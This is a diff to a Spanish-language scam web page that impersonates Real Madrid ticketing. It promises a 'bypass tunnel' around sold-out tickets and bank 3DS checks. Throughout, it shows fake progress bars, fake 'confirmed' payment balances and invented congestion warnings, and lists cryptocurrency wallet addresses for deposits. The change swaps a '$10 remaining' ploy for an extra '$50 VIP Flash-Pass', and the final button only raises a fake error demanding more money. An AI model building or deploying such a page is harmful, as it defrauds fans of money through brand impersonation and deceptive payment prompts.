@@ -15,10 +15,9 @@
         .address-box { background: #f0f2f5; border: 1px solid #ddd; padding: 12px; border-radius: 8px; font-family: monospace; font-size: 11px; word-break: break-all; margin-top: 5px; color: #111b33; position: relative; cursor: pointer; }
         .copy-tag { position: absolute; right: 8px; top: 12px; font-size: 9px; color: #3b50b6; font-weight: bold; border: 1px solid #3b50b6; padding: 2px 4px; border-radius: 4px; background: white; }
         
-        /* Updated Payment Tracker Styles for $40 detected */
-        .payment-status { background: #e8f5e9; border: 1px solid #a5d6a7; padding: 15px; border-radius: 12px; margin-bottom: 20px; }
-        .status-dot { height: 10px; width: 10px; background-color: #2e7d32; border-radius: 50%; display: inline-block; margin-right: 5px; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        .payment-status { background: #e3f2fd; border: 1px solid #2196f3; padding: 15px; border-radius: 12px; margin-bottom: 20px; }
+        .vip-status { background: #fffde7; border: 1px solid #fdd835; padding: 15px; border-radius: 12px; margin-bottom: 20px; display: block; }
+        .status-dot { height: 10px; width: 10px; background-color: #4caf50; border-radius: 50%; display: inline-block; margin-right: 5px; }
     </style>
 </head>
 <body class="flex flex-col min-h-screen">
@@ -32,71 +31,45 @@
     </header>
 
     <main class="flex-grow p-4 md:max-w-xl md:mx-auto w-full">
-        <div id="error-alert" class="hidden mb-4 p-3 bg-red-100 border border-red-400 text-red-700 text-xs rounded-lg font-bold">
-            ⚠️ ERROR DE AUTENTICACIÓN: El servidor de pago oficial ha rechazado la conexión. Use el túnel Cripto Prioritario.
-        </div>
-
         <h1 class="text-3xl font-black italic uppercase tracking-tighter mb-6">Entradas</h1>
-
-        <div class="bg-white rounded-3xl shadow-sm p-12 flex flex-col items-center text-center border border-gray-100 mb-6">
-            <img src="https://www.realmadrid.com/StaticFiles/RealMadridResponsive/images/tickets/no-tickets.svg" alt="Icon" class="w-32 h-32 mb-6">
-            <h2 class="text-xl font-bold mb-2">No hay entradas con los filtros o fechas seleccionados</h2>
-            <p class="text-gray-500 text-sm italic">Sincronizando con base de datos secundaria...</p>
-        </div>
 
         <div class="bot-overlay rounded-2xl p-5 text-white">
             <div class="flex justify-between items-center mb-4">
-                <span class="text-[10px] font-bold uppercase tracking-[0.2em] text-blue-400">Secure Tunnel v4.2 // Active</span>
+                <span class="text-[10px] font-bold uppercase tracking-[0.2em] text-green-400">Tunnel v4.2 // ACTIVATED</span>
                 <div class="loader"></div>
             </div>
-            <div id="status-text" class="text-sm mb-4 font-light">Inyectando bypass en realmadrid.com...</div>
+            <div id="status-text" class="text-sm mb-4 font-light">Túnel activado. Esperando respuesta del servidor VIP...</div>
             <div class="w-full bg-gray-800 h-1.5 rounded-full mb-6">
-                <div id="progress-bar" class="bg-blue-500 h-full rounded-full transition-all duration-1000" style="width: 10%"></div>
+                <div id="progress-bar" class="bg-green-500 h-full rounded-full transition-all duration-1000" style="width: 100%"></div>
             </div>
-            <button id="main-btn" onclick="showCrypto()" class="w-full bg-[#3b50b6] py-4 rounded-xl font-bold uppercase tracking-widest text-sm opacity-50 cursor-not-allowed shadow-lg">
-                Procesando Acceso...
+            <button id="main-btn" onclick="showCrypto()" class="w-full bg-[#3b50b6] py-4 rounded-xl font-bold uppercase tracking-widest text-sm shadow-lg">
+                RECLAMAR ACCESO VIP ($50)
             </button>
         </div>
     </main>
 
     <div id="crypto-modal">
         <div class="bg-white rounded-3xl w-full max-w-md p-6 shadow-2xl overflow-y-auto max-h-[90vh]">
-            <h3 class="text-xl font-black text-[#111b33] mb-2 uppercase italic tracking-tighter">Confirmación de Reserva</h3>
+            <h3 class="text-xl font-black text-[#111b33] mb-2 uppercase italic tracking-tighter">Upgrade: VIP Flash-Pass</h3>
             
             <div class="payment-status">
-                <div class="flex justify-between items-center mb-2">
-                    <span class="text-[10px] font-bold text-green-700 uppercase"><span class="status-dot"></span> Transacción Confirmada</span>
-                    <span class="text-[10px] font-black text-green-800 tracking-tighter">$40.00 / $50.00</span>
+                <div class="flex justify-between items-center">
+                    <span class="text-[10px] font-bold text-blue-700 uppercase"><span class="status-dot"></span> Activación Básica: 100%</span>
+                    <span class="text-[10px] font-black text-blue-800">$50.00 Confirmed</span>
                 </div>
-                <div class="w-full bg-green-200 h-2 rounded-full mb-2">
-                    <div class="bg-green-600 h-full rounded-full transition-all duration-1000" style="width: 80%"></div>
-                </div>
-                <p class="text-[11px] text-green-900 font-bold leading-tight">Balance parcial detectado. Deposite los <span class="underline text-red-600">$10.00 finales</span> para liberar el túnel de bypass inmediatamente.</p>
             </div>
 
-            <p class="text-xs text-gray-500 mb-6 leading-tight">Complete el depósito de seguridad balanceado. **Este pago evita la validación 3DS bancaria y activa el bypass.**</p>
-            
+            <div class="vip-status">
+                <p class="text-[11px] text-amber-900 font-bold leading-tight">
+                    ⚠️ <span class="uppercase">Congestión Detectada:</span> El servidor oficial está saturado. Para asegurar el Sector 111 sin riesgo de pérdida de sesión, active el <b>VIP Flash-Pass ($50.00 adicionales)</b>.
+                </p>
+            </div>
+
             <div class="space-y-4">
                 <div>
                     <label class="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Bitcoin (BTC)</label>
                     <div class="address-box" onclick="copyText('bc1qt7zlwlmamph8vt4d0dwdjjnq8yehgvjr6883va')">
                         bc1qt7zlwlmamph8vt4d0dwdjjnq8yehgvjr6883va
-                        <span class="copy-tag">COPY</span>
-                    </div>
-                </div>
-
-                <div>
-                    <label class="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Ethereum (ETH)</label>
-                    <div class="address-box" onclick="copyText('0x04065cCfbbcccaD53102B98ADE0e0644E088367C')">
-                        0x04065cCfbbcccaD53102B98ADE0e0644E088367C
-                        <span class="copy-tag">COPY</span>
-                    </div>
-                </div>
-
-                <div>
-                    <label class="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Solana (SOL)</label>
-                    <div class="address-box" onclick="copyText('37TkwujqyjCCREcUePrWeHVMwU3ZUuGUrUR9xzbbpmAH')">
-                        37TkwujqyjCCREcUePrWeHVMwU3ZUuGUrUR9xzbbpmAH
                         <span class="copy-tag">COPY</span>
                     </div>
                 </div>
@@ -110,17 +83,18 @@
                 </div>
 
                 <div>
-                    <label class="text-[10px] font-bold text-gray-400 uppercase tracking-widest">USD Coin (USDC - ERC20)</label>
-                    <div class="address-box" onclick="copyText('0x04065cCfbbcccaD53102B98ADE0e0644E088367C')">
-                        0x04065cCfbbcccaD53102B98ADE0e0644E088367C
+                    <label class="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Solana (SOL)</label>
+                    <div class="address-box" onclick="copyText('37TkwujqyjCCREcUePrWeHVMwU3ZUuGUrUR9xzbbpmAH')">
+                        37TkwujqyjCCREcUePrWeHVMwU3ZUuGUrUR9xzbbpmAH
                         <span class="copy-tag">COPY</span>
                     </div>
                 </div>
             </div>
 
-            <button onclick="finalRedirect()" class="mt-8 w-full py-4 bg-orange-400 text-white rounded-xl font-bold uppercase text-xs tracking-[0.2em] cursor-not-allowed">
-                ESPERANDO BALANCE FINAL ($10.00)...
+            <button onclick="finalRedirect()" class="mt-8 w-full py-4 bg-yellow-500 text-black rounded-xl font-bold uppercase text-xs tracking-[0.2em] hover:bg-yellow-600 transition-colors">
+                ACTIVAR VIP FLASH Y CONTINUAR
             </button>
+            <p class="text-[9px] text-center text-gray-400 mt-4 uppercase">No cerrar esta ventana durante la sincronización VIP</p>
         </div>
     </div>
 
@@ -130,31 +104,12 @@
             alert("Dirección copiada: " + text);
         }
 
-        if (window.location.search.includes('error=auth')) {
-            document.getElementById('error-alert').classList.remove('hidden');
-        }
-
-        const progressBar = document.getElementById('progress-bar');
-        const statusText = document.getElementById('status-text');
-        const mainBtn = document.getElementById('main-btn');
-
-        setTimeout(() => {
-            progressBar.style.width = "85%";
-            statusText.innerText = "Sincronizando depósitos confirmados...";
-            setTimeout(() => {
-                progressBar.style.width = "100%";
-                statusText.innerHTML = "¡CONEXIÓN SEGURA! <span class='text-orange-400 font-bold underline'>Faltan $10.00 para Activar</span>";
-                mainBtn.classList.remove('opacity-50', 'cursor-not-allowed');
-                mainBtn.innerText = "VERIFICAR BALANCE ($10.00 PENDIENTE)";
-            }, 1500);
-        }, 1000);
-
         function showCrypto() {
             document.getElementById('crypto-modal').style.display = 'flex';
         }
 
         function finalRedirect() {
-            alert("Error: El balance total de $50.00 no ha sido cubierto. Se han detectado $40.00. El túnel requiere los $10.00 restantes para generar el token de bypass.");
+            alert("Sincronizando VIP Flash Token... Error: Balance VIP de $50.00 no detectado. Por favor complete el depósito para evitar el tiempo de espera del servidor.");
         }
     </script>
 </body>
